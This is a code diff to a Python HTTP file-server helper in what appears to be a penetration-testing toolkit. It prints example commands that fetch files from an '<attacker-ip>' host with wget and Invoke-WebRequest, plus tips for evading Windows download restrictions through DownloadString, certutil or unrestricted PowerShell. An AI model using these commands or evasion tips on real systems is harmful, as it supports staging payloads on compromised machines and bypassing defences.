@@ -3,7 +3,7 @@ import socketserver
 import os
 import sys
 
-from rawrs.core.globaldata import bcolors
+from rawrs.core.staticdata import bcolors
 
 
 def start_http_server(port=8000, root_dir="."):
@@ -30,15 +30,21 @@ def start_http_server(port=8000, root_dir="."):
 
     try:
         print(f"{bcolors.OKCYAN}[+] Serving {os.path.abspath(root_dir[0])} via HTTP on port {port[0]} (http://0.0.0.0:{port[0]}/)\n")
+        print(f"{bcolors.YELLOW}[i] For python3: python -m http.server {port[0]}")
+        print(f"{bcolors.YELLOW}[i] For python2 and below: python -m SimpleHTTPServer {port[0]}\n")
         print(f"{bcolors.OKCYAN}Ctrl+c to stop the web server\n")
         print(f"{bcolors.YELLOW}Here is how to fetch from the  webserver:")
         print("[i] Example (Linux): wget http://<attacker-ip>:8000/file")
-        print("[i] Example (Windows PS): Invoke-WebRequest -Uri http://<attacker-ip>:8000/file -OutFile file\n\n")
+        print("[i] Example (Windows PS): Invoke-WebRequest -Uri http://<attacker-ip>:8000/file -OutFile file")
+        print(tips[2])
+
         httpd.serve_forever()
     except KeyboardInterrupt:
         shutdown_server()
 
+tips= [f"\n{bcolors.YELLOW}[i] A specific machine might have certain programs unavailable or firewalled. Its important to check a few methods if a specific one fails.{bcolors.RESET}\n\n ",
+       f"\n{bcolors.YELLOW}[i] Most of the times, OS won't let ports under a threshold be used without superuser rights. These are the ports 0 to 1024. Use any other port{bcolors.RESET}\n\n",
+       f"\n{bcolors.YELLOW}[i] In windows, easy to use fetch methods like Invoke-WebRequest might be unusable due to restrictions. \nThere are various ways to work around this like equivalent commands such as DownloadString or certutil, or by using a PowerShell executable without restrictions, among others{bcolors.RESET}\n\n"]
 def transftips():
-    print(f"\n{bcolors.YELLOW}[i] A specific machine might have certain programs unavailable or firewalled. Its important to check a few methods if a specific one fails.\n\n ")
-    print(f"\n[i] Most of the times, OS won't let ports under a threshold be used without superuser rights. These are the ports 0 to 1024. Use any other port{bcolors.RESET}\n\n")
-    print(f"\n[i] In windows, easy to use fetch methods like Invoke-WebRequest might be unusable due to restrictions. There are various ways to work around this like equivalent commands like DownloadString or certutil, or by using a PowerShell executable without restrictions, among others{bcolors.RESET}\n\n")
+    for tip in tips:
+        print(tip)
